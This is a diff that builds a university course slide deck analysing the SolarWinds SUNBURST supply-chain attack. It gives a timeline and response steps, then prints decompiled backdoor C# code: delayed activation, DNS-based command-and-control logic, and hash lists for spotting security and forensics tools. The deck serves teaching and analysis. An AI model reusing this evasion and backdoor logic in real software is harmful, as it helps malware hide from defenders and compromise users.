@@ -1,40 +1,738 @@
 <!doctype html>
 <html lang="en">
-	<head>
-		<meta charset="utf-8">
-		<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 
-		<title>reveal.js</title>
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
 
-		<link rel="stylesheet" href="dist/reset.css">
-		<link rel="stylesheet" href="dist/reveal.css">
-		<link rel="stylesheet" href="dist/theme/black.css">
+	<link href="https://fonts.googleapis.com/css2?family=Reenie+Beanie&display=swap" rel="stylesheet">
 
-		<!-- Theme used for syntax highlighted code -->
-		<link rel="stylesheet" href="plugin/highlight/monokai.css">
-	</head>
-	<body>
-		<div class="reveal">
-			<div class="slides">
-				<section>Slide 1</section>
-				<section>Slide 2</section>
-			</div>
+	<title>UNC2452-SolarWinds</title>
+
+	<link rel="stylesheet" href="dist/reset.css">
+	<link rel="stylesheet" href="dist/reveal.css">
+	<link rel="stylesheet" href="dist/theme/KJblack.css">
+
+	<!-- Theme used for syntax highlighted code -->
+	<link rel="stylesheet" href="plugin/highlight/monokai.css">
+	<link rel="stylesheet" href="css/KJCustom.css">
+
+</head>
+
+<body>
+	<div class="reveal">
+		<div class="slides">
+
+			<section data-background-image="assets/UCB-001-TriangleChain-Outline.svg">
+				UNC2452
+				<h1>SolarWinds</h1>
+				<img class="logo" data-src="assets/Berkeley-wordmark-white-UC.png"
+					style="border-radius: 1rem; height: 150px;" />
+				<div>MICS-204 Summer 2024</div>
+				<p>Karl-Johan Westhoff</p>
+			</section>
+
+
+			<section>
+				<div class="attack-slide">
+					<h2>Attack</h2>
+
+
+
+					<div class="timeline-container">
+						<div class="timeline"></div>
+						<div class="timeline-event" style="left: 10%;">
+							<div class="timeline-time fragment" data-fragment-index="1">
+								<h5>January 2019</h5>
+							</div>
+
+							<div class="timeline-card attack fragment" data-fragment-index="2">
+								<img src="assets/hacker-svgrepo-com.svg" alt="hacker icon">
+
+
+							</div>
+							<div class="div_float attack fragment" data-fragment-index="2">
+								<div class="speech-bubble" data-fragment-index="3">"If we hit this: <br>
+									<img style="height: 1.5rem; margin: 0;" src="assets/solarwinds.svg" alt=""> <br>
+									company's software, a lot more can be hit with the same hack"
+								</div>
+							</div>
+
+						</div>
+
+
+						<div class="timeline-event" style="left: 30%;">
+							<div class="timeline-time fragment" data-fragment-index="3">
+								<h5>February 2020</h5>
+							</div>
+
+
+							<div class="timeline-card attack fragment" data-fragment-index="3">
+								<div class="float-text fragment" data-fragment-index="4">SUNBURST</div>
+								<img class="syringe fragment" data-fragment-index="4" src="assets/injection-syringe-svgrepo-com.svg" alt="inject icon">
+								<img class="bricks" src="assets/build-wall-svgrepo-com.svg" alt="build stack icon">
+								<div class="float-buildstack">"Orion" Buildstack</div>
+							</div>
+
+
+
+						</div>
+
+
+
+
+						<div class="timeline-event" style="left: 50%;">
+							<div class="timeline-time fragment" data-fragment-index="5">
+								<h5>June 2020</h5>
+							</div>
+						
+							<div class="timeline-card attack fragment" data-fragment-index="6">
+								<img class="cleanup fragment fade-out" data-fragment-index="7" src="assets/clean-svgrepo-com.svg" alt="cleanup icon">
+								<img class="binary fragment fade-out" data-fragment-index="7" src="assets/binary-code-svgrepo-com.svg" alt="binary icon">
+							</div>
+
+						
+						</div>
+						
+						
+					
+					</div>
+				</div>
+			</section>
+
+			<section>
+				<h2>First Discovery</h2>
+				<div class="timeline-container absolute">
+					<div class="timeline"></div>
+
+					<div class="timeline-event" style="left: 10%;">
+						<div class="timeline-time fragment" data-fragment-index="1">
+							<h5>December 2020</h5>
+						</div>
+						<div class="timeline-card disco fragment" data-fragment-index="1">
+							<img src="assets/fireeye.svg" alt="fireeye logo">
+							<img src="assets/analyst.svg" alt="analystIcon">
+
+						</div>
+						<div class="div_float fragment fade-in-then-out" data-fragment-index="2">
+							<div class="speech-bubble" data-fragment-index="3">Hmm... unauthorized registration of new
+								equipment, wait a minute - We have been BREACHED!</div>
+						</div>
+
+					</div>
+					<div class="timeline-event" style="left: 30%;">
+						<div class="timeline-time fragment" data-fragment-index="4">
+							<h5>December 12 2020</h5>
+						</div>
+						<div class="timeline-investigation fragment" data-fragment-index="4">
+							<p>Investigate..</p>
+							<ul>
+								<li>Red team tools hit</li>
+								<li>Origin: SolarWinds 'Orion'</li>
+								<li>Named it: "SUNBURST"</li>
+								<li>Notified SolarWinds</li>
+								<li>Go at it, Analyze!</li>
+							</ul>
+						</div>
+
+
+
+
+
+					</div>
+					<div class="timeline-event" style="left: 50%;">
+						<div class="timeline-time fragment" data-fragment-index="5">
+							<h5>December 14 2020</h5>
+						</div>
+						<div class="timeline-sw fragment" data-fragment-index="5">
+							<img src="assets/solarwinds.svg" alt="SolarWinds Logo">
+							<p>Unpleasant notice to customers..</p>
+						</div>
+					</div>
+				</div>
+
+
+			</section>
+
+
+			<section>
+				<div class="header">
+					<img style="height: 2em; top:-20px;" src="assets/solarwinds.svg" alt="SolarWinds Logo">
+				</div>
+
+				<a class="reference fragment fade-out" data-fragment-index="6"
+					href="https://youtu.be/6gQ5oAWHMoU?si=-mQcrzoOGpjaUe-J" target="_blank" class="reference">[1]
+					SUNBURST From The Inside Tim Brown, CISO of SolarWinds</a>
+
+
+				<div class="splash-box np fragment" data-fragment-index="6">
+					<p>Get Help !!!</p>
+					<ul class="list">
+						<li>call the lawyers</li>
+						<li>CrowdStrike</li>
+						<li>DLA Piper</li>
+						<li>KPMG</li>
+						<li>FBI</li>
+						<li>CISA</li>
+					</ul>
+				</div>
+
+
+
+				<div class="splash-box eng fragment" data-fragment-index="7">
+					<h2>ENGINEER</h2>
+					<p>Stop the Attack</p>
+					<p>Develop Patches</p>
+					<p>Determine Impact</p>
+					<p>Do Forensics</p>
+				</div>
+
+				<div class="splash-box comms fragment" data-fragment-index="8">
+					<h4>COMMUNICATE</h4>
+					<ul>
+						<li>File SEC Form 8-K report</li>
+						<li>Pick up the phone</li>
+						<li>Inform authorities</li>
+						<li>Inform media</li>
+					</ul>
+				</div>
+
+				<div class="splash-box postit fragment" data-fragment-index="9">
+					<h4>Attention</h4>
+					<ul>
+						<li>Everybody wants to get 'in on it'</li>
+						<li>Covid</li>
+						<li>Microsoft</li>
+						<li>Media</li>
+					</ul>
+				</div>
+
+
+
+
+
+				<div class="timeline-container">
+					<div class="timeline"></div>
+					<div class="timeline-event" style="left: 10%;">
+						<div class="timeline-time">
+							<h5>December 13 2020</h5>
+						</div>
+					</div>
+					<div class="timeline-event" style="left: 30%;"></div>
+					<div class="timeline-event" style="left: 50%;"></div>
+					<div class="timeline-event" style="left: 70%;"></div>
+
+					<div class="timeline-event" style="left: 50%;">
+						<div class="timeline-time">
+							<h5>January 2021</h5>
+						</div>
+					</div>
+				</div>
+
+			</section>
+
+			<section>
+				Description of the Attack
+				<div>
+					<ul>
+						<li class="fragment" data-fragment-index="8">Code only present in a range of versions of
+							deployed software
+							<ul>
+								<li>Malware transplanted into Orion build process</li>
+								<li>Code eventually found on a crashed server with a build VM</li>
+							</ul>
+						</li>
+
+						<li class="reconSlide fragment" data-fragment-index="9">Attacker did recon prior to attack
+							<ul>
+								<li>Probed vulnerabilities</li>
+								<li>Removed all traces</li>
+							</ul>
+						</li>
+
+
+					</ul>
+
+
+				</div>
+				<aside class="notes" data-markdown>
+					<textarea data-template>
+						- SupplyChain Attack
+						  - It utilizes the trust companies have in out-sourced resources
+						  - Trying to make security someone elses problem
+						- The attack surface and reach is much larger for the same effort (a lot more can be hit with the same hack)  
+						- Hacking SolarWinds put the attacker in a "wolf shepherds clothing" situation. In hindsight security vendors are an obvious target
+					</textarea>
+				</aside>
+			</section>
+
+			<section>
+				<section>
+					Stealthy code
+					<ul>
+						<li>Small Footprint</li>
+						<li>Obfuscated by de-compiling and re compiling</li>
+						<li>Made to look like source host</li>
+						<li>Features to look for Malware monitoring/antivirus</li>
+						<li>Patient to evade logging</li>
+					</ul>
+
+
+					<h4>SolarWinds.Orion.Core.BusinessLayer.dll</h4>
+					<h4>&#8681;</h4>
+
+				</section>
+
+				<section>
+					<h4>A new thread is started, calling
+						an ’Initialize()’ function as a background process</h4>
+					<pre class="language-csharp">
+						<code style="width: 120%;"  data-line-numbers="2,8-12">
+internal void RefreshInternal()
+{
+	if (InventoryManager.log.get_IsDebugEnabled())
+	InventoryManager.log.DebugFormat("Running scheduled background backgroundInventory check on engine {0}", (object) this.engineID);
+	try
+	{
+	if (!OrionImprovementBusinessLayer.IsAlive)
+		new Thread(new ThreadStart(OrionImprovementBusinessLayer.Initialize))
+		{
+		IsBackground = true
+		}.Start();
+	}
+	catch (Exception ex)
+	{
+	}
+	if (this.backgroundInventory.IsRunning)
+	{
+	InventoryManager.log.Info((object) "Skipping background backgroundInventory check, still running");
+	}
+	else
+	{
+	this.QueueInventoryTasksFromNodeSettings();
+	this.QueueInventoryTasksFromInventorySettings();
+	if (this.backgroundInventory.QueueSize <= 0)
+		return;
+	this.backgroundInventory.Start();
+	}
+}
+						</code>
+
+						
+
+					</pre>
+					<aside class="notes" data-markdown>
+						<textarea data-template>
+							- Starts a process Initialize() in the background..
+						</textarea>
+					</aside>
+
+				</section>
+
+				<section>
+					<h4>The OrionImprovementBusinessLayer.Initialize function</h4>
+					<pre class="language-csharp">
+						<code style="width: 120%;"  data-line-numbers="2,4|35|6|8-10|12|27">
+public static void Initialize()
+{
+try
+{
+	if (OrionImprovementBusinessLayer.GetHash(Process.GetCurrentProcess().ProcessName.ToLower()) == 17291806236368054941UL /* solarwinds.businesslayerhost (SolarWinds - dev) */)
+	{
+		DateTime lastWriteTime = File.GetLastWriteTime(Assembly.GetExecutingAssembly().Location);
+		int num = new Random().Next(288, 336);
+		if (DateTime.Now.CompareTo(lastWriteTime.AddHours((double)num)) >= 0)
+		{
+			OrionImprovementBusinessLayer.instance = new NamedPipeServerStream(OrionImprovementBusinessLayer.appId);
+			OrionImprovementBusinessLayer.ConfigManager.ReadReportStatus(out OrionImprovementBusinessLayer.status);
+			if (OrionImprovementBusinessLayer.status != OrionImprovementBusinessLayer.ReportStatus.Truncate)
+			{
+				OrionImprovementBusinessLayer.DelayMin(0, 0);
+				OrionImprovementBusinessLayer.domain4 = IPGlobalProperties.GetIPGlobalProperties().DomainName;
+				if (!string.IsNullOrEmpty(OrionImprovementBusinessLayer.domain4) && 
+					// Continue infection only if the domain name passes the following check
+					!OrionImprovementBusinessLayer.IsNullOrInvalidName(OrionImprovementBusinessLayer.domain4))
+				{
+					OrionImprovementBusinessLayer.DelayMin(0, 0);
+					if (OrionImprovementBusinessLayer.GetOrCreateUserID(out OrionImprovementBusinessLayer.userId))
+					{
+						OrionImprovementBusinessLayer.DelayMin(0, 0);
+						OrionImprovementBusinessLayer.ConfigManager.ReadServiceStatus(false);
+						OrionImprovementBusinessLayer.Update();  // Main malicious code
+						OrionImprovementBusinessLayer.instance.Close();
+					}
+				}
+			}
+		}
+	}
+}
+catch (Exception)
+{
+}
+}
+						</code>
+
+						
+
+					</pre>
+					<aside class="notes" data-markdown>
+						<textarea data-template>
+							Some wired stuff going on, many nested if's:
+							- try-catch does nothing if fails
+							- Checks current process name against a custom hashed value
+							  - GetHash 17291806236368054941UL = “solarwinds.businesslayerhost”
+							- Checks time has passed since installation (Random 12-14 days)
+							- Other if's check for appId
+							- Eventually end up lunching the "Update()" function 
+
+						</textarea>
+					</aside>
+				</section>
+
+				<section>
+					<h4>Update() function</h4>
+					<pre class="language-csharp">
+						<code style="width: 120%;"  data-line-numbers="2|24">
+private static void Update()
+{
+	bool flag = false;
+	OrionImprovementBusinessLayer.CryptoHelper cryptoHelper = new OrionImprovementBusinessLayer.CryptoHelper(OrionImprovementBusinessLayer.userId, OrionImprovementBusinessLayer.domain4);
+	OrionImprovementBusinessLayer.HttpHelper httpHelper = null;
+	Thread thread = null;
+	bool flag2 = true;
+	OrionImprovementBusinessLayer.AddressFamilyEx addressFamilyEx = OrionImprovementBusinessLayer.AddressFamilyEx.Unknown;
+	int num = 0;
+	bool flag3 = true;
+	OrionImprovementBusinessLayer.DnsRecords dnsRecords = new OrionImprovementBusinessLayer.DnsRecords();
+	Random random = new Random();
+	int a = 0;
+	if (!OrionImprovementBusinessLayer.UpdateNotification())
+	{
+		return;
+	}
+	OrionImprovementBusinessLayer.svcListModified2 = false;
+	int num2 = 1;
+	while (num2 <= 3 && !flag)
+	{
+		OrionImprovementBusinessLayer.DelayMin(dnsRecords.A, dnsRecords.A);
+		if (!OrionImprovementBusinessLayer.ProcessTracker.TrackProcesses(true))
+		{
+			if (OrionImprovementBusinessLayer.svcListModified1)
+			{
+				flag3 = true;
+			}
+			num = (OrionImprovementBusinessLayer.svcListModified2 ? (num + 1) : 0);
+			string hostName;
+			if (OrionImprovementBusinessLayer.status == OrionImprovementBusinessLayer.ReportStatus.New)
+			{
+				if (addressFamilyEx != OrionImprovementBusinessLayer.AddressFamilyEx.Error)
+				{
+					hostName = cryptoHelper.GetPreviousString(out flag2);
+				}
+				else
+				{
+					hostName = cryptoHelper.GetCurrentString();
+				}
+			}
+			else
+			{
+				if (OrionImprovementBusinessLayer.status != OrionImprovementBusinessLayer.ReportStatus.Append)
+				{
+					break;
+				}
+				if (!flag3)
+				{
+					hostName = cryptoHelper.GetNextString(dnsRecords.dnssec);
+				}
+				else
+				{
+					hostName = cryptoHelper.GetNextStringEx(dnsRecords.dnssec);
+				}
+			}
+			addressFamilyEx = OrionImprovementBusinessLayer.DnsHelper.GetAddressFamily(hostName, dnsRecords);
+			switch (addressFamilyEx)
+			{
+			case OrionImprovementBusinessLayer.AddressFamilyEx.NetBios:
+				if (OrionImprovementBusinessLayer.status == OrionImprovementBusinessLayer.ReportStatus.Append)
+				{
+					flag3 = false;
+					if (dnsRecords.dnssec)
+					{
+						a = dnsRecords.A;
+						dnsRecords.A = random.Next(1, 3);
+					}
+				}
+				if (OrionImprovementBusinessLayer.status == OrionImprovementBusinessLayer.ReportStatus.New && flag2)
+				{
+					OrionImprovementBusinessLayer.status = OrionImprovementBusinessLayer.ReportStatus.Append;
+					OrionImprovementBusinessLayer.ConfigManager.WriteReportStatus(OrionImprovementBusinessLayer.status);
+				}
+				if (!string.IsNullOrEmpty(dnsRecords.cname))
+				{
+					dnsRecords.A = a;
+					OrionImprovementBusinessLayer.HttpHelper.Close(httpHelper, thread);
+					httpHelper = new OrionImprovementBusinessLayer.HttpHelper(OrionImprovementBusinessLayer.userId, dnsRecords);
+					if (!OrionImprovementBusinessLayer.svcListModified2 || num > 1)
+					{
+						OrionImprovementBusinessLayer.svcListModified2 = false;
+						thread = new Thread(new ThreadStart(httpHelper.Initialize))
+						{
+							IsBackground = true
+						};
+						thread.Start();
+					}
+				}
+				num2 = 0;
+				break;
+			case OrionImprovementBusinessLayer.AddressFamilyEx.ImpLink:
+			case OrionImprovementBusinessLayer.AddressFamilyEx.Atm:
+				OrionImprovementBusinessLayer.ConfigManager.WriteReportStatus(OrionImprovementBusinessLayer.ReportStatus.Truncate);
+				OrionImprovementBusinessLayer.ProcessTracker.SetAutomaticMode();
+				flag = true;
+				break;
+			case OrionImprovementBusinessLayer.AddressFamilyEx.Ipx:
+				if (OrionImprovementBusinessLayer.status == OrionImprovementBusinessLayer.ReportStatus.Append)
+				{
+					OrionImprovementBusinessLayer.ConfigManager.WriteReportStatus(OrionImprovementBusinessLayer.ReportStatus.New);
+				}
+				flag = true;
+				break;
+			case OrionImprovementBusinessLayer.AddressFamilyEx.InterNetwork:
+			case OrionImprovementBusinessLayer.AddressFamilyEx.InterNetworkV6:
+			case OrionImprovementBusinessLayer.AddressFamilyEx.Unknown:
+				goto IL_1CE;
+			case OrionImprovementBusinessLayer.AddressFamilyEx.Error:
+				dnsRecords.A = random.Next(420, 540);
+				break;
+			default:
+				goto IL_1CE;
+			}
+			IL_1FA:
+			num2++;
+			continue;
+			IL_1CE:
+			flag = true;
+			goto IL_1FA;
+		}
+		break;
+	}
+	OrionImprovementBusinessLayer.HttpHelper.Close(httpHelper, thread);
+}
+						</code>
+
+						
+
+					</pre>
+					<aside class="notes" data-markdown>
+						<textarea data-template>
+
+
+						</textarea>
+					</aside>
+				</section>
+				<section>
+					<h4>Looking for running processes</h4>
+					<pre class="language-csharp">
+						<code style="width: 120%;">
+private static readonly ulong[] assemblyTimeStamps = new ulong[]
+{
+	2597124982561782591UL      /* apimonitor-x64 (Rohitab - RE/Malware analysis) */,
+	2600364143812063535UL      /* apimonitor-x86 (Rohitab - RE/Malware analysis) */,
+	13464308873961738403UL     /* autopsy64 (Autopsy - Forensics) */,
+	4821863173800309721UL      /* autopsy (Autopsy - Forensics) */,
+	12969190449276002545UL     /* autoruns64 (Autoruns - RE/Malware analysis) */,
+	3320026265773918739UL      /* autoruns (Autoruns - RE/Malware analysis) */,
+	12094027092655598256UL     /* autorunsc64 (Autoruns - RE/Malware analysis) */,
+	10657751674541025650UL     /* autorunsc (Autoruns - RE/Malware analysis) */,
+	11913842725949116895UL     /* binaryninja (Binary Ninja - RE/Malware analysis) */,
+	5449730069165757263UL      /* blacklight (Blacklight - Forensics) */,
+	292198192373389586UL       /* cff explorer (NTCore Explorer Suite - RE/Malware analysis) */,
+	12790084614253405985UL     /* cutter (Rizin Cutter - RE/Malware analysis) */,
+	5219431737322569038UL      /* de4dot (de4dot - Forensics) */,
+	15535773470978271326UL     /* debugview (DebugView - RE/Malware analysis) */,
+	7810436520414958497UL      /* diskmon (DiskMon - RE/Malware analysis) */,
+	13316211011159594063UL     /* dnsd (Symantec - Antivirus) */,
+	13825071784440082496UL     /* dnspy (dnSpy - RE/Malware analysis) */,
+	14480775929210717493UL     /* dotpeek32 (dotPeek - RE/Malware analysis) */,
+	14482658293117931546UL     /* dotpeek64 (dotPeek - RE/Malware analysis) */,
+	8473756179280619170UL      /* dumpcap (Wireshark - RE/Malware analysis) */,
+	3778500091710709090UL      /* evidence center (Belkasoft Evidence Center - Forensics) */,
+	8799118153397725683UL      /* exeinfope (Exeinfo PE - RE/Malware analysis) */,
+	12027963942392743532UL     /* fakedns (fakedns (iDefense) - RE/Malware analysis) */,
+	576626207276463000UL       /* fakenet (fakenet - RE/Malware analysis) */,
+	7412338704062093516UL      /* ffdec (Free Flash Decompiler - RE/Malware analysis) */,
+	682250828679635420UL       /* fiddler (Fiddler - RE/Malware analysis) */,
+	13014156621614176974UL     /* fileinsight (McAfee - RE/Malware analysis) */,
+	18150909006539876521UL     /* floss (FireEye - RE/Malware analysis) */,
+	10336842116636872171UL     /* gdb (gdb - RE/Malware analysis) */,
+	12785322942775634499UL     /* hiew32demo (Hiew - RE/Malware analysis) */,
+	13260224381505715848UL     /* hiew32 (Hiew - RE/Malware analysis) */,
+	17956969551821596225UL     /* hollows_hunter (hollows hunter - RE/Malware analysis) */,
+	8709004393777297355UL      /* idaq64 (IDA - RE/Malware analysis) */,
+	14256853800858727521UL     /* idaq (IDA - RE/Malware analysis) */,
+	8129411991672431889UL      /* idr (InsightDR? - RE/Malware analysis) */,
+	15997665423159927228UL     /* ildasm (IL Disassembler - RE/Malware analysis) */,
+	10829648878147112121UL     /* ilspy (ILSpy - RE/Malware analysis) */,
+	9149947745824492274UL      /* jd-gui (Java Decompiler - RE/Malware analysis) */,
+	3656637464651387014UL      /* lordpe (LordPE - RE/Malware analysis) */,
+	3575761800716667678UL      /* officemalscanner (Officemalscanner - RE/Malware analysis) */,
+	4501656691368064027UL      /* ollydbg (OllyDbg - RE/Malware analysis) */,
+	10296494671777307979UL     /* pdfstreamdumper (PDFStreamDumper - RE/Malware analysis) */,
+	14630721578341374856UL     /* pe-bear (PE-bear - RE/Malware analysis) */,
+	4088976323439621041UL      /* pebrowse64 (Pebrowser - RE/Malware analysis) */,
+	9531326785919727076UL      /* peid (PeiD - RE/Malware analysis) */,
+	6461429591783621719UL      /* pe-sieve32 (PE-sieve - RE/Malware analysis) */,
+	6508141243778577344UL      /* pe-sieve64 (PE-sieve - RE/Malware analysis) */,
+	10235971842993272939UL     /* pestudio (pestudio - RE/Malware analysis) */,
+	2478231962306073784UL      /* peview (Peview - RE/Malware analysis) */,
+	9903758755917170407UL      /* pexplorer (Pexplorer - RE/Malware analysis) */,
+	14710585101020280896UL     /* ppee (PPEE - RE/Malware analysis) */,
+	14710585101020280896UL     /* ppee (PPEE - RE/Malware analysis) */,
+	13611814135072561278UL     /* procdump64 (ProcDump - RE/Malware analysis) */,
+	2810460305047003196UL      /* procdump (ProcDump - RE/Malware analysis) */,
+	2032008861530788751UL      /* processhacker (Process Hacker - RE/Malware analysis) */,
+	27407921587843457UL        /* procexp64 (Process Explorer - RE/Malware analysis) */,
+	6491986958834001955UL      /* procexp (Process Explorer - RE/Malware analysis) */,
+	2128122064571842954UL      /* procmon (ProcMon - RE/Malware analysis) */,
+	10484659978517092504UL     /* prodiscoverbasic (ProDiscovery - Forensics) */,
+	8478833628889826985UL      /* py2exedecompiler (Py2ExeDecompiler - RE/Malware analysis) */,
+	10463926208560207521UL     /* r2agent (Radare2 - RE/Malware analysis) */,
+	7080175711202577138UL      /* rabin2 (Radare2 - RE/Malware analysis) */,
+	8697424601205169055UL      /* radare2 (Radare2 - RE/Malware analysis) */,
+	7775177810774851294UL      /* ramcapture64 (Ram Capturer - Forensics) */,
+	16130138450758310172UL     /* ramcapture (Ram Capturer - Forensics) */,
+	506634811745884560UL       /* reflector (Red Gate Reflector - RE/Malware analysis) */,
+	18294908219222222902UL     /* regmon (RegMon - RE/Malware analysis) */,
+	3588624367609827560UL      /* resourcehacker (Resource Hacker - RE/Malware analysis) */,
+	9555688264681862794UL      /* retdec-ar-extractor (Avast RetDec - RE/Malware analysis) */,
+	5415426428750045503UL      /* retdec-bin2llvmir (Avast RetDec - RE/Malware analysis) */,
+	3642525650883269872UL      /* retdec-bin2pat (Avast RetDec - RE/Malware analysis) */,
+	13135068273077306806UL     /* retdec-config (Avast RetDec - RE/Malware analysis) */,
+	3769837838875367802UL      /* retdec-fileinfo (Avast RetDec - RE/Malware analysis) */,
+	191060519014405309UL       /* retdec-getsig (Avast RetDec - RE/Malware analysis) */,
+	1682585410644922036UL      /* retdec-idr2pat (Avast RetDec - RE/Malware analysis) */,
+	7878537243757499832UL      /* retdec-llvmir2hll (Avast RetDec - RE/Malware analysis) */,
+	13799353263187722717UL     /* retdec-macho-extractor (Avast RetDec - RE/Malware analysis) */,
+	1367627386496056834UL      /* retdec-pat2yara (Avast RetDec - RE/Malware analysis) */,
+	12574535824074203265UL     /* retdec-stacofin (Avast RetDec - RE/Malware analysis) */,
+	16990567851129491937UL     /* retdec-unpacker (Avast RetDec - RE/Malware analysis) */,
+	8994091295115840290UL      /* retdec-yarac (Avast RetDec - RE/Malware analysis) */,
+	13876356431472225791UL     /* rundotnetdll (RunDotNetDLL - RE/Malware analysis) */,
+	14968320160131875803UL     /* sbiesvc (Sandboxie - Virtualization/container) */,
+	14868920869169964081UL     /* scdbg (SCDBG - RE/Malware analysis) */,
+	106672141413120087UL       /* scylla_x64 (Scylla - RE/Malware analysis) */,
+	79089792725215063UL        /* scylla_x86 (Scylla - RE/Malware analysis) */,
+	5614586596107908838UL      /* shellcode_launcher (Shellcode Launcher - RE/Malware analysis) */,
+	3869935012404164040UL      /* solarwindsdiagnostics (SolarWinds - dev/test) */,
+	3538022140597504361UL      /* sysmon64 (Sysmon - EDR) */,
+	14111374107076822891UL     /* sysmon (Sysmon - EDR) */,
+	7982848972385914508UL      /* task explorer (Task Explorer - RE/Malware analysis) */,
+	8760312338504300643UL      /* task explorer-64 (Task Explorer - RE/Malware analysis) */,
+	17351543633914244545UL     /* tcpdump (tcpdump - RE/Malware analysis) */,
+	7516148236133302073UL      /* tcpvcon (TCPView - RE/Malware analysis) */,
+	15114163911481793350UL     /* tcpview (TCPView - RE/Malware analysis) */,
+	15457732070353984570UL     /* vboxservice (VirtualBox - Virtualization/container) */,
+	16292685861617888592UL     /* win32_remote (IDA - RE/Malware analysis) */,
+	10374841591685794123UL     /* win64_remotex64 (IDA - RE/Malware analysis) */,
+	3045986759481489935UL      /* windbg (WinDbg (Microsoft) - RE/Malware analysis) */,
+	17109238199226571972UL     /* windump (WinPcap WinDump - RE/Malware analysis) */,
+	6827032273910657891UL      /* winhex64 (WinHex - RE/Malware analysis) */,
+	5945487981219695001UL      /* winhex (WinHex - RE/Malware analysis) */,
+	8052533790968282297UL      /* winobj (WinObj - RE/Malware analysis) */,
+	17574002783607647274UL     /* wireshark (Wireshark - RE/Malware analysis) */,
+	3341747963119755850UL      /* x32dbg (x64dbg - RE/Malware analysis) */,
+	14193859431895170587UL     /* x64dbg (x64dbg - RE/Malware analysis) */,
+	17439059603042731363UL     /* xwforensics64 (X-Ways Forensics - RE/Malware analysis) */,
+	17683972236092287897UL     /* xwforensics (X-Ways Forensics - RE/Malware analysis) */,
+	700598796416086955UL       /* redcloak (Red Cloak / SecureWorks - EDR) */,
+	3660705254426876796UL      /* avgsvc (AVG - Antivirus) */,
+	12709986806548166638UL     /* avgui (AVG - Antivirus) */,
+	3890794756780010537UL      /* avgsvca (AVG - Antivirus) */,
+	2797129108883749491UL      /* avgidsagent (AVG - Antivirus) */,
+	3890769468012566366UL      /* avgsvcx (AVG - Antivirus) */,
+	14095938998438966337UL     /* avgwdsvcx (AVG - Antivirus) */,
+	11109294216876344399UL     /* avgadminclientservice (AVG - Antivirus) */,
+	1368907909245890092UL      /* afwserv (Avast - Antivirus) */,
+	11818825521849580123UL     /* avastui (Avast - Antivirus) */,
+	8146185202538899243UL      /* avastsvc (Avast - Antivirus) */,
+	2934149816356927366UL      /* aswidsagent (Avast/AVG - Antivirus) */,
+	13029357933491444455UL     /* aswidsagenta (Avast/AVG - Antivirus) */,
+	6195833633417633900UL      /* aswengsrv (Avast/AVG - Antivirus) */,
+	2760663353550280147UL      /* avastavwrapper (Avast - Antivirus) */,
+	16423314183614230717UL     /* bccavsvc (Avast - Antivirus) */,
+	2532538262737333146UL      /* psanhost (Panda Security - EDR) */,
+	4454255944391929578UL      /* psuaservice (Panda Security - EDR) */,
+	6088115528707848728UL      /* psuamain (Panda Security - EDR) */,
+	13611051401579634621UL     /* avp (Kaspersky - Antivirus) */,
+	18147627057830191163UL     /* avpui (Kaspersky - Antivirus) */,
+	17633734304611248415UL     /* ksde (Kaspersky - EDR) */,
+	13581776705111912829UL     /* ksdeui (Kaspersky - EDR) */,
+	7175363135479931834UL      /* tanium (Tanium - EDR) */,
+	3178468437029279937UL      /* taniumclient (Tanium - EDR) */,
+	13599785766252827703UL     /* taniumdetectengine (Tanium - EDR) */,
+	6180361713414290679UL      /* taniumendpointindex (Tanium - EDR) */,
+	8612208440357175863UL      /* taniumtracecli (Tanium - EDR) */,
+	8408095252303317471UL      /* taniumtracewebsocketclient64 (Tanium - EDR) */
+};
+
+private static readonly ulong[] configTimeStamps = new ulong[]
+{
+	17097380490166623672UL     /* cybkerneltracker.sys (CyberArk - EDR) */,
+	15194901817027173566UL     /* atrsdfw.sys (Altiris / Symantec - EDR) */,
+	12718416789200275332UL     /* eaw.sys (Raytheon Cyber Solutions - EDR) */,
+	18392881921099771407UL     /* rvsavd.sys (OPSWAT / CJSC Returnil - EDR) */,
+	3626142665768487764UL      /* dgdmk.sys (Verdasys - EDR) */,
+	12343334044036541897UL     /* sentinelmonitor.sys (SentinelOne - EDR) */,
+	397780960855462669UL       /* hexisfsmonitor.sys (Hexis Cyber Solutions - EDR) */,
+	6943102301517884811UL      /* groundling32.sys (Dell Secureworks - EDR) */,
+	13544031715334011032UL     /* groundling64.sys (Dell Secureworks - EDR) */,
+	11801746708619571308UL     /* safe-agent.sys (SAFE-Cyberdefense - EDR) */,
+	18159703063075866524UL     /* crexecprev.sys (Cybereason - EDR) */,
+	835151375515278827UL       /* psepfilter.sys (Absolute Software - EDR) */,
+	16570804352575357627UL     /* cve.sys (Absolute Software Corp. - EDR) */,
+	1614465773938842903UL      /* brfilter.sys (Bromium - App allowlisting) */,
+	12679195163651834776UL     /* brcow_x_x_x_x.sys (Bromium - App allowlisting) */,
+	2717025511528702475UL      /* lragentmf.sys (LogRhythm - EDR) */,
+	17984632978012874803UL     /* libwamf.sys (OPSWAT - EDR development) */
+};
+					
+						</code>
+
+						
+
+					</pre>
+					<aside class="notes" data-markdown>
+						<textarea data-template>
+							Hashed values, de hashed by various cyber security entities
+						</textarea>
+					</aside>
+				</section>
+			</section>
+
+
 		</div>
+	</div>
 
-		<script src="dist/reveal.js"></script>
-		<script src="plugin/notes/notes.js"></script>
-		<script src="plugin/markdown/markdown.js"></script>
-		<script src="plugin/highlight/highlight.js"></script>
-		<script>
-			// More info about initialization & config:
-			// - https://revealjs.com/initialization/
-			// - https://revealjs.com/config/
-			Reveal.initialize({
-				hash: true,
+	<script src="dist/reveal.js"></script>
+	<script src="plugin/notes/notes.js"></script>
+	<script src="plugin/markdown/markdown.js"></script>
+	<script src="plugin/highlight/highlight.js"></script>
+	<script>
+		// More info about initialization & config:
+		// - https://revealjs.com/initialization/
+		// - https://revealjs.com/config/
+		Reveal.initialize({
+			hash: true,
 
-				// Learn about plugins: https://revealjs.com/plugins/
-				plugins: [ RevealMarkdown, RevealHighlight, RevealNotes ]
-			});
-		</script>
-	</body>
+			// Learn about plugins: https://revealjs.com/plugins/
+			plugins: [RevealMarkdown, RevealHighlight, RevealNotes]
+		});
+		Reveal.configure({ pdfSeparateFragments: false });
+		// Reveal.configure({ showNotes: true });
+		// Reveal.configure({ showNotes: 'separate-page' });
+	</script>
+
+
+</body>
+
 </html>
